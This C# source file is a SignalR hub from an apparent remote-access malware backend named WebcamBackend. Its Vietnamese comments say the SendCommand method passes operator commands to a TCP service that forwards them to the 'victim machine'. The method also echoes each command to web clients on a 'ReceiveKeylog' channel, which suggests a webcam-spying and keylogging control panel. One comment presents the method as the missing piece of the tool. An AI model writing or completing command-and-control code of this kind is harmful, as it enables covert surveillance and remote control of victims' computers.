using Microsoft.AspNetCore.SignalR;
using System.Text.RegularExpressions;

namespace WebcamBackend.Hubs
{
    public class WebcamHub: Hub
    {
        // Sự kiện để báo cho TcpServerService biết có lệnh mới
        public static event Action<string> OnCommandReceived;

        // --- HÀM NÀY LÀ CÁI BẠN ĐANG THIẾU ---
        public async Task SendCommand(string command)
        {
            // 1. Kích hoạt sự kiện để Service gửi lệnh xuống máy nạn nhân
            OnCommandReceived?.Invoke(command);

            // 2. Báo lại cho Web biết (để hiện log chơi)
            await Clients.All.SendAsync("ReceiveKeylog", $"[System]: Sending command '{command}'...");
        }
    }
}
